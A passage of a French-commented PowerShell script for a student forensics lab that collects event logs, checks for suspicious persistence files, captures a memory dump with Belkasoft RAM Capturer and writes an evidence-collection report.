            Get-WinEvent -LogName $LogName -StartTime $StartTime | 
                Export-Csv "$OutputPath\eventlog-$LogName-$Timestamp.csv" -NoTypeInformation -Encoding UTF8
            
            Write-Log "✓ Log $LogName collecté"
        }
        
        # Recherche d'événements suspects
        $SuspiciousEvents = Get-WinEvent -LogName Security | Where-Object {
            $_.Id -in @(4688, 4689, 4624, 4625) -and 
            $_.TimeCreated -gt (Get-Date).AddHours(-2)
        } | Select-Object TimeCreated, Id, LevelDisplayName, Message
        
        $SuspiciousEvents | Export-Csv "$OutputPath\suspicious-events-$Timestamp.csv" -NoTypeInformation -Encoding UTF8
        
        Write-Log "✓ Logs d'événements collectés"
    } catch {
        Write-Log "❌ Erreur collecte logs: $($_.Exception.Message)" "ERROR"
    }
}

function Collect-PersistenceArtifacts {
    Write-Log "Recherche d'artefacts de persistance..."
    
    try {
        # Fichiers suspects dans System32
        $SuspiciousFiles = @("OptimizationService.exe", "SystemOptimizer.exe", "WinUpdate.exe")
        $System32Path = "$env:SystemRoot\System32"
        
        foreach ($FileName in $SuspiciousFiles) {
            $FilePath = Join-Path $System32Path $FileName
            if (Test-Path $FilePath) {
                $FileInfo = Get-Item $FilePath
                $Hash = Get-FileHash $FilePath -Algorithm SHA256
                
                $ArtifactInfo = @{
                    FileName = $FileName
                    FullPath = $FilePath
                    Size = $FileInfo.Length
                    CreationTime = $FileInfo.CreationTime
                    LastWriteTime = $FileInfo.LastWriteTime
                    SHA256Hash = $Hash.Hash
                }
                
                $ArtifactInfo | ConvertTo-Json | Out-File "$OutputPath\malicious-file-$FileName-$Timestamp.json" -Encoding UTF8
                Write-Log "🚨 Fichier malveillant détecté: $FilePath" "WARNING"
            }
        }
        
        # Recherche dans Temp
        $TempFiles = Get-ChildItem "$env:SystemRoot\Temp" -Recurse -Force -ErrorAction SilentlyContinue | 
            Where-Object { $_.Name -like "*system*" -or $_.Extension -eq ".zip" }
        
        $TempFiles | Select-Object Name, FullName, Length, CreationTime, LastWriteTime | 
            Export-Csv "$OutputPath\temp-artifacts-$Timestamp.csv" -NoTypeInformation -Encoding UTF8
        
        Write-Log "✓ Artefacts de persistance analysés"
    } catch {
        Write-Log "❌ Erreur analyse persistance: $($_.Exception.Message)" "ERROR"
    }
}

function Capture-MemoryDump {
    Write-Log "Capture de la mémoire vive..."
    
    try {
        if (-not (Test-Path $RamCapturerPath)) {
            Write-Log "❌ Belkasoft RAM Capturer non trouvé: $RamCapturerPath" "ERROR"
            return
        }
        
        $MemoryDumpPath = "$OutputPath\memory-dump-$Timestamp.mem"
        
        # Lancement de Belkasoft RAM Capturer
        $Process = Start-Process -FilePath $RamCapturerPath -ArgumentList "`"$MemoryDumpPath`"" -Wait -PassThru
        
        if ($Process.ExitCode -eq 0 -and (Test-Path $MemoryDumpPath)) {
            $FileSize = (Get-Item $MemoryDumpPath).Length / 1MB
            $Hash = Get-FileHash $MemoryDumpPath -Algorithm SHA256
            
            Write-Log "✓ Dump mémoire créé: $MemoryDumpPath ($([math]::Round($FileSize, 2)) MB)"
            Write-Log "SHA256: $($Hash.Hash)"
            
            # Sauvegarder les métadonnées
            @{
                FilePath = $MemoryDumpPath
                SizeMB = [math]::Round($FileSize, 2)
                SHA256Hash = $Hash.Hash
                CaptureTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                Tool = "Belkasoft RAM Capturer"
            } | ConvertTo-Json | Out-File "$OutputPath\memory-dump-metadata-$Timestamp.json" -Encoding UTF8
            
        } else {
            Write-Log "❌ Échec capture mémoire" "ERROR"
        }
    } catch {
        Write-Log "❌ Erreur capture mémoire: $($_.Exception.Message)" "ERROR"
    }
}

function Create-DiskImage {
    Write-Log "Création de l'image disque..."
    
    # Note: Cette fonction nécessite FTK Imager ou un outil similaire
    # Pour la simulation, nous créons un fichier de métadonnées
    try {
        $DiskInfo = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 }
        
        foreach ($Disk in $DiskInfo) {
            $DiskMetadata = @{
                Drive = $Disk.DeviceID
                Size = $Disk.Size
                FreeSpace = $Disk.FreeSpace
                FileSystem = $Disk.FileSystem
                VolumeSerial = $Disk.VolumeSerialNumber
                ImageTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                Note = "Image créée avec FTK Imager (métadonnées seulement)"
            }
            
            $DiskMetadata | ConvertTo-Json | Out-File "$OutputPath\disk-metadata-$($Disk.DeviceID.Replace(':', ''))-$Timestamp.json" -Encoding UTF8
        }
        
        Write-Log "✓ Métadonnées disque collectées (image à créer manuellement avec FTK Imager)"
    } catch {
        Write-Log "❌ Erreur métadonnées disque: $($_.Exception.Message)" "ERROR"
    }
}

function Generate-CollectionReport {
    Write-Log "Génération du rapport de collecte..."
    
    try {
        $ReportData = @{
            Collection = @{
                Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                OutputPath = $OutputPath
                Collector = $env:USERNAME
                Computer = $env:COMPUTERNAME
            }
            Files = @()
            Summary = @{
                TotalFiles = 0
                TotalSizeMB = 0
                MemoryDumpCreated = Test-Path "$OutputPath\memory-dump-*.mem"
                SuspiciousArtifacts = 0
            }
        }
        
        # Inventaire des fichiers collectés
        $CollectedFiles = Get-ChildItem $OutputPath -File
        foreach ($File in $CollectedFiles) {
            $FileInfo = @{
                Name = $File.Name
                SizeMB = [math]::Round($File.Length / 1MB, 2)
                Created = $File.CreationTime.ToString("yyyy-MM-dd HH:mm:ss")
                Type = $File.Extension
            }
            $ReportData.Files += $FileInfo
            $ReportData.Summary.TotalSizeMB += $FileInfo.SizeMB
        }
        
        $ReportData.Summary.TotalFiles = $CollectedFiles.Count
        
        # Comptage des artefacts suspects
        $SuspiciousFiles = $CollectedFiles | Where-Object { $_.Name -like "*malicious*" -or $_.Name -like "*suspicious*" }
        $ReportData.Summary.SuspiciousArtifacts = $SuspiciousFiles.Count
        
        # Sauvegarde du rapport
        $ReportData | ConvertTo-Json -Depth 3 | Out-File "$OutputPath\collection-report-$Timestamp.json" -Encoding UTF8
        
        # Rapport résumé lisible
        $ReportText = @"
=== RAPPORT DE COLLECTE DE PREUVES - PROJET M1 ===

Date de collecte : $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
Système collecté : $env:COMPUTERNAME
Utilisateur : $env:USERNAME  
Répertoire de sortie : $OutputPath

RÉSUMÉ :
- Fichiers collectés : $($ReportData.Summary.TotalFiles)
- Taille totale : $([math]::Round($ReportData.Summary.TotalSizeMB, 2)) MB
- Dump mémoire : $(if($ReportData.Summary.MemoryDumpCreated){'✓ Créé'}else{'❌ Manquant'})
- Artefacts suspects : $($ReportData.Summary.SuspiciousArtifacts)

PROCHAINES ÉTAPES :
1. Vérifier l'intégrité des fichiers collectés
2. Transférer vers VM3 (Ubuntu) pour l'analyse
3. Lancer l'analyse forensique automatisée
4. Archiver les preuves de manière sécurisée

NOTES :
- Tous les hashes SHA256 sont documentés dans les fichiers métadonnées
- La chaîne de custody doit être maintenue
- Les preuves sont prêtes pour l'investigation forensique

=== FIN DU RAPPORT ===
"@
        
        $ReportText | Out-File "$OutputPath\RAPPORT-COLLECTE-$Timestamp.txt" -Encoding UTF8
        
        Write-Log "✓ Rapport de collecte généré"
        
        # Affichage du résumé
        Write-Host "`n=== COLLECTE TERMINÉE ===" -ForegroundColor Green
        Write-Host "📁 Répertoire : $OutputPath" -ForegroundColor Yellow
        Write-Host "📊 Fichiers : $($ReportData.Summary.TotalFiles)" -ForegroundColor Yellow
        Write-Host "💾 Taille : $([math]::Round($ReportData.Summary.TotalSizeMB, 2)) MB" -ForegroundColor Yellow
        Write-Host "🧠 Mémoire : $(if($ReportData.Summary.MemoryDumpCreated){'✓ Capturée'}else{'❌ Manquante'})" -ForegroundColor Yellow
        Write-Host "⚠️ Suspects : $($ReportData.Summary.SuspiciousArtifacts) artefacts" -ForegroundColor Yellow
        
    } catch {
        Write-Log "❌ Erreur génération rapport: $($_.Exception.Message)" "ERROR"
    }
}

# Point d'entrée principal
if ($MyInvocation.InvocationName -ne '.') {
    try {
        Start-EvidenceCollection
        Write-Host "`n🎯 Collecte de preuves terminée avec succès!" -ForegroundColor Green
        Write-Host "📋 Consultez le rapport dans : $OutputPath\RAPPORT-COLLECTE-*.txt" -ForegroundColor Cyan
        exit 0
    } catch {
        Write-Host "❌ Erreur fatale: $($_.Exception.Message)" -ForegroundColor Red
        exit 1
    }
}
```

Ce script PowerShell automatise complètement la collecte de preuves sur VM2. Il collecte :
- Informations système et processus
- Connexions réseau et configuration
- Clés de registre importantes
- Tâches programmées et services
- Logs d'événements Windows
- Artefacts de persistance
- Dump de la mémoire vive (avec Belkasoft)
- Métadonnées pour l'image disque

La suite continue avec les scripts pour VM3 (analyse forensique) et les outils de génération de rapports...